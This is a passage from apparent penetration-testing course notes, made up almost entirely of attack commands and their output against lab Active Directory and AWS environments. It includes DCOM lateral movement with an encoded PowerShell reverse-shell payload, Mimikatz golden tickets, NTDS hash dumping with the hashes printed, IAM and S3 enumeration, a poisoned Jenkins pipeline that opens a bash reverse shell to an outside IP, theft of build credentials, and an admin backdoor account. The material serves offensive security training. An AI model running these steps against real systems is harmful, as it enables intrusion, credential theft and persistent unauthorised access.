        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 9/14/2022 5:31:32 (local)
        End Time:   9/14/2022 15:31:13 (local)
        Renew Time: 9/21/2022 5:31:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
~~~


#### Accessing the shared folder through the injected ticket

~~~ powershell
PS C:\Tools> ls \\web04\backup


    Directory: \\web04\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
~~~



### DCOM
---

#### Remotely Instantiating the MMC Application object

~~~ powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
~~~

#### Executing a command on the remote DCOM object

~~~ powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
~~~

#### Verifying that calculator is running on FILES04

~~~ powershell
C:\Users\Administrator>tasklist | findstr "calc"
win32calc.exe                 4764 Services                   0     12,132 K
~~~

#### Adding a reverse-shell as a DCOM payload on CLIENT74

~~~ powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
~~~


#### Obtaining a reverse-shell through DCOM lateral movement

~~~ powershell
kali@kali:~$ nc -lnvp 443
listening on [any] 443 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.73] 50778

PS C:\Windows\system32> whoami
corp\jen

PS C:\Windows\system32> hostname
FILES04
~~~


## Active Directory Persistence

### Golden Ticket
---

#### Dumping the krbtgt password hash using Mimikatz
~~~ powershell
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
...
~~~


#### Purging existing Kerberos Tickets

~~~ powershell
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK
~~~



#### Creating a golden ticket using Mimikatz

~~~ powershell
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800
~~~

#### Using PsExec to access DC01

~~~ powershell
C:\Tools\SysinternalsSuite>PsExec.exe \\dc1 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


C:\Windows\system32>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::5cd4:aacd:705a:3289%14
   IPv4 Address. . . . . . . . . . . : 192.168.50.70
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
C:\Windows\system32>whoami
corp\jen
~~~


### Shadow Copies
---

#### Performing a Shadow Copy of the entire C: drive

~~~ powershell
C:\Tools>vshadow.exe -nw -p  C:

VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.


(Option: No-writers option detected)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000010
Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:


Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...

* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 9/19/2022 4:31:51 AM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  Auto_Release No_Writers Differential


Snapshot creation done.
~~~

#### Copying the ntds database to the C: drive

~~~ powershell
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
   1 file(s) copied.
~~~



#### Copying the ntds database to the C: drive

~~~ powershell
C:\>reg.exe save hklm\system c:\system.bak
The operation completed successfully.
~~~

#### Copying the ntds database to the C: drive

~~~ bash
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::
[*] Kerberos keys from ntds.dit.bak
Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4
DC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
DC1$:des-cbc-md5:f7f804ce43264a43
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
...
[*] Cleaning up...
~~~


# Enumerating AWS Cloud Infrastructure

## Using dnsenum to Automate DNS Reconnaissance of offseclab.io Domain

~~~ bash
dnsenum offseclab.io --threads 100
~~~

## Running Quick Scan Against offseclab-assets-public-axevtewi Bucket Using cloud_enum in AWS

~~~ bash
cloud_enum -k offseclab-assets-public-axevtewi --quickscan --disable-azure --disable-gcp
~~~

## Making a Dictionary of Keywords to Search S3 Buckets

~~~ bash
for key in "public" "private" "dev" "prod" "development" "production"; do echo "offseclab-assets-$key-axevtewi"; done | tee /tmp/keyfile.txt
~~~

## Running cloud_enum Against The Generated keyfile.txt File

~~~ bash
cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
~~~


### Reconnaissance via Cloud Service Provider's API
---

#### Installing AWS CLI in Kali Linux

~~~ bash
sudo apt update
sudo apt install -y awscli
~~~

#### Configuring Profile and Validating Communication with AWS API

~~~ bash
kali@kali:~$ aws configure --profile attacker
AWS Access Key ID []: AKIAQO...
AWS Secret Access Key []: cOGzm...
Default region name []: us-east-1
Default output format []: json

kali@kali:~$ aws --profile attacker sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU5VFQCHOI4",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/attacker"
}
~~~

#### Listing All Public AMIs Owned by Amazon AWS

~~~ bash
aws --profile attacker ec2 describe-images --owners amazon --executable-users all
~~~

#### Getting the Name of the Public Bucket with curl

~~~ bash
kali@kali:~$ curl -s www.offseclab.io | grep -o -P 'offseclab-assets-public-\w{8}'
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
offseclab-assets-public-kaykoour
~~~


#### Listing the Public Bucket as the attacker

~~~ bash
kali@kali:~$ aws --profile attacker s3 ls offseclab-assets-public-kaykoour
                           PRE sites/
~~~

#### Creating the IAM User "enum" and Generating AccessKeyId and SecretAccessKey for that User

~~~ bash
kali@kali:~$ aws --profile attacker iam create-user --user-name enum
{
    "User": {
        "Path": "/",
        "UserName": "enum",
        "UserId": "AIDAQOMAIGYU4HTPEJ32K",
        "Arn": "arn:aws:iam::123456789012:user/enum",
    }
}

kali@kali:~$ aws --profile attacker iam create-access-key --user-name enum
{
    "AccessKey": {
        "UserName": "enum",
        "AccessKeyId": "[AccessKeyId]",
        "Status": "Active",
        "SecretAccessKey": "[SecretAccessKey]",
    }
}
~~~

#### Configuring AWS CLI with Profile "enum"

~~~ bash
kali@kali:~$ aws configure --profile enum
AWS Access Key ID [None]: [AWS Access Key ID]
AWS Secret Access Key [None]: [AWS Secret Access Key]
Default region name [None]: us-east-1
Default output format [None]: json

kali@kali:~$ aws sts get-caller-identity --profile enum
{
    "UserId": "AIDAQOMAIGYU4HTPEJ32K",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/enum"
}
~~~

#### Listing the Private Bucket with the enum User

~~~ bash
kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied  
~~~

#### Policy to Allow Listing Buckets and Reading Objects

~~~ bash
# policy-s3-read.json
{
     "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowResourceAccount",
            "Effect": "Allow",
            "Action": [
                "s3:ListBucket",
                "s3:GetObject"
            ],
            "Resource": "*",
            "Condition": {
                "StringLike": {"s3:ResourceAccount": ["0*"]}
            }
        }
    ]
}
~~~

#### Creating the policy document file

~~~ bash
kali@kali:~$ nano policy-s3-read.json

kali@kali:~$ cat -n policy-s3-read.json 
     1  {
     2      "Version": "2012-10-17",
     3      "Statement": [
     4          {
     5              "Sid": "AllowResourceAccount",
     6              "Effect": "Allow",
     7              "Action": [
     8                  "s3:ListBucket",
     9                  "s3:GetObject"
    10              ],
    11              "Resource": "*",
    12              "Condition": {
    13                  "StringLike": {"s3:ResourceAccount": ["0*"]}
    14              }
    15          }
    16      ]
    17  }

~~~

#### Attaching the s3-read Inline Policy to the enum IAM User

~~~ bash
kali@kali:~$ aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-read.json

kali@kali:~$ aws --profile attacker iam list-user-policies --user-name enum
{
    "PolicyNames": [
        "s3-read"
    ]
}
~~~

#### Changing the Condition in the Policy and Testing Again

~~~ bash
kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied  

kali@kali:~$ nano policy-s3-read.json

kali@kali:~$ cat -n policy-s3-read.json 
     1  {
     2      "Version": "2012-10-17",
     3      "Statement": [
     4          {
     5              "Sid": "AllowResourceAccount",
     6              "Effect": "Allow",
     7              "Action": [
     8                  "s3:ListBucket",
     9                  "s3:GetObject"
    10              ],
    11              "Resource": "*",
    12              "Condition": {
    13                  "StringLike": {"s3:ResourceAccount": ["1*"]}
    14              }
    15          }
    16      ]
    17  }

kali@kali:~$ aws --profile attacker iam put-user-policy \
--user-name enum \
--policy-name s3-read \
--policy-document file://policy-s3-read.json

kali@kali:~$ aws --profile enum s3 ls offseclab-assets-private-kaykoour
                           PRE sites/
~~~


#### Creating a S3 Bucket in the attacker's Account

~~~ bash
kali@kali:~$ aws --profile attacker s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM
make_bucket: offseclab-dummy-bucket-28967-25641-13328
~~~

#### Policy Granting Permission to List the Bucket to a Single IAM User

~~~ bash
kali@kali:~$ nano grant-s3-bucket-read.json

kali@kali:~$ cat grant-s3-bucket-read.json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowUserToListBucket",
            "Effect": "Allow",
            "Resource": "arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328",
            "Principal": {
                "AWS": ["arn:aws:iam::123456789012:user/cloudadmin"]
            },
            "Action": "s3:ListBucket"

        }
    ]
}
~~~

#### Attaching the Resource Based Policy to the Test Bucket

~~~ bash
kali@kali:~$ aws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read.json 

kali@kali:~$ 
~~~



#### Creating a List of Roles to Search in the Account

~~~ bash
kali@kali:~$ echo -n "lab_admin
security_auditor
content_creator
student_access
lab_builder
instructor
network_config
monitoring_logging
backup_restore
content_editor" > /tmp/role-names.txt
~~~

#### Installing pacu in Kali Linux Using the Package Manager

~~~ bash
kali@kali:~$ sudo apt update

kali@kali:~$ sudo apt install pacu
~~~

#### Starting pacu in Interactive Mode

~~~ bash
kali@kali:~$ pacu

....
Database created at /root/.local/share/pacu/sqlite.db

What would you like to name this new session? offseclab
Session offseclab created.

...

Pacu (offseclab:No Keys Set) > 
~~~



#### Importing the attacker Profile Credentials in pacu

~~~ bash
Pacu (offseclab:No Keys Set) > import_keys attacker
  Imported keys as "imported-attacker"
Pacu (offseclab:imported-attacker) > 
~~~


#### Listing Modules in pacu

~~~ bash
Pacu (offseclab:imported-attacker) > ls
...
[Category: RECON_UNAUTH]

  iam__enum_roles
  iam__enum_users

...
~~~


#### Running the enum_roles Module in pacu

~~~ bash
Pacu (offseclab:imported-attacker) > run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012
  Running module iam__enum_roles...
...
~~~


# Attacking AWS Cloud Infrastructure

## Enumeration

### Enumerating the Application
---

#### Running Enumeration on S3 Bucket

~~~ bash
kali@kali:~$ head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt

kali@kali:~$ dirb https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com ./first50.txt
...
---- Scanning URL: https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/ ----
+ https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com/.git/HEAD (CODE:200|SIZE:23)      
...
DOWNLOADED: 50 - FOUND: 1
~~~

#### Configuring AWS CLI

~~~ bash
kali@kali:~$ aws configure
AWS Access Key ID [None]: [AWS Access Key ID]
AWS Secret Access Key [None]: [AWS Secret Access Key]
Default region name [None]: us-east-1
Default output format [None]: 
~~~


#### Listing Bucket

~~~ bash
kali@kali:~$ aws s3 ls staticcontent-lgudbhv8syu2tgbk
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2023-04-04 13:00:52        972 CONTRIBUTING.md
2023-04-04 13:00:52         79 Caddyfile
2023-04-04 13:00:52        407 Jenkinsfile
2023-04-04 13:00:52        850 README.md
2023-04-04 13:00:52        176 docker-compose.yml
~~~


## Discovering Secrets

### Downloading the Bucket
---

#### Listing Bucket

~~~ bash
kali@kali:~$ aws s3 ls staticcontent-lgudbhv8syu2tgbk
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2023-04-04 13:00:52        972 CONTRIBUTING.md
2023-04-04 13:00:52         79 Caddyfile
2023-04-04 13:00:52        407 Jenkinsfile
2023-04-04 13:00:52        850 README.md
2023-04-04 13:00:52        176 docker-compose.yml
~~~

#### Copy the S3 bucket

~~~ bash
kali@kali:~$ aws s3 cp s3://staticcontent-lgudbhv8syu2tgbk/README.md ./
download: s3://staticcontent-lgudbhv8syu2tgbk/README.md to ./README.md
~~~


#### Downloading the S3 bucket

~~~ bash
kali@kali:~$ mkdir static_content                                     

kali@kali:~$ aws s3 sync s3://staticcontent-lgudbhv8syu2tgbk ./static_content/
download: s3://staticcontent-lgudbhv8syu2tgbk/.git/COMMIT_EDITMSG to static_content/.git/COMMIT_EDITMSG
...
download: s3://staticcontent-lgudbhv8syu2tgbk/images/kittens.jpg to static_content/images/kittens.jpg

kali@kali:~$ cd static_content

kali@kali:~/static_content$ 
~~~

### Searching for Secrets in Git
---

#### Installing gitleaks

~~~ bash
sudo apt update
sudo apt install -y gitleaks
~~~

#### Using gitleaks to Search for Secrets

~~~ bash
kali@kali:~/static_content$ gitleaks detect

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks 

1:58PM INF no leaks found
1:58PM INF scan completed in 61.787205ms
~~~

#### Review Git History

~~~ bash
git log
~~~


#### Review Git Diff

~~~ bash
git show 64382765366943dd1270e945b0b23dbed3024340
~~~


## Poisoning the Pipeline


### Modifying the Pipeline
---

#### Basic Jenkinsfile - Final Payload

~~~ bash
pipeline {
  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/192.88.99.76/4242 0>&1" & '
            }
          }
        }
      }
    }
  }
}
~~~


### Enumerating the Builder
---

#### Discovering AWS Keys

~~~ bash
jenkins@fcd3cc360d9e:~$ env | grep AWS
env | grep AWS
AWS_DEFAULT_REGION=us-east-1
AWS_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=[AWS_SECRET_ACCESS_KEY]
AWS_ACCESS_KEY_ID=[AWS_ACCESS_KEY_ID]
~~~


## Compromising the Environment via Backdoor Account

### Discovering What We Have Access To
---

#### Configuring a new profile

~~~ bash
kali@kali:~$ aws configure --profile=CompromisedJenkins                                                           
AWS Access Key ID [None]: [AWS Access Key ID]
AWS Secret Access Key [None]: [AWS Secret Access Key]
Default region name [None]: us-east-1
Default output format [None]: 
~~~


#### Getting User Name

~~~ bash
kali@kali:~$ aws --profile CompromisedJenkins sts get-caller-identity
{
    "UserId": "AIDAUBHUBEGILTF7TFWME",
    "Account": "274737132808",
    "Arn": "arn:aws:iam::274737132808:user/system/jenkins-admin",
}
~~~

#### Listing Policies and Group for User

~~~ bash
kali@kali:~$ aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
{
    "PolicyNames": [
        "jenkins-admin-role"
    ]
}

kali@kali:~$ aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
{
    "AttachedPolicies": []
}

kali@kali:~$ aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
{
    "Groups": []
}
~~~

#### Getting Policy

~~~ bash
kali@kali:~$ aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
{
    "UserName": "jenkins-admin",
    "PolicyName": "jenkins-admin-role",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "",
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }
}
~~~

### Creating a Backdoor Account
---

#### Create User

~~~ bash
kali@kali:~$ aws --profile CompromisedJenkins iam create-user --user-name backdoor                                  
{
    "User": {
        "Path": "/",
        "UserName": "backdoor",
        "UserId": "AIDAUBHUBEGIPX2SBIHLB",
        "Arn": "arn:aws:iam::274737132808:user/backdoor",
    }
}
~~~


#### Attach Admin Policy

~~~ bash
kali@kali:~$ aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

kali@kali:~$ 
~~~

#### Get User Credentials

~~~ bash
kali@kali:~$ aws --profile CompromisedJenkins iam create-access-key --user-name backdoor
{
    "AccessKey": {
        "UserName": "backdoor",
        "AccessKeyId": "[AccessKeyId]",
        "Status": "Active",
        "SecretAccessKey": "[SecretAccessKey]",
    }
}
~~~



#### Configure profile and list policies

~~~ bash
kali@kali:~$ aws configure --profile=backdoor                                           
AWS Access Key ID [None]: [AWS Access Key ID]
AWS Secret Access Key [None]: [AWS Secret Access Key]
Default region name [None]: us-east-1
Default output format [None]:  

kali@kali:~$ aws --profile backdoor iam list-attached-user-policies --user-name backdoor
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
~~~

